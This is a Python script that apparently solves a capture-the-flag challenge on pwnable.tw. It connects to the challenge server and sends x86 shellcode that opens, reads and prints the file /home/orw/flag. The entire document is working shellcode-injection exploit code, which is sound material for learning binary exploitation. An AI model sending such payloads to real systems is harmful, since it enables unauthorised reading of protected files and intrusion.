#!/usr/bin/env python3
import socket
import time

shellcode = bytes.fromhex("31c0506867616c66682f72772f682f686f6d89e331c931d2b005cd8089c389e131d2b26431c0b003cd8089c231c0b004b301cd8031c040cd80")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw", 10001))

data = s.recv(1024)
print(data.decode())

s.send(shellcode)

time.sleep(1)
response = s.recv(1024)
print(response.decode())

s.close()
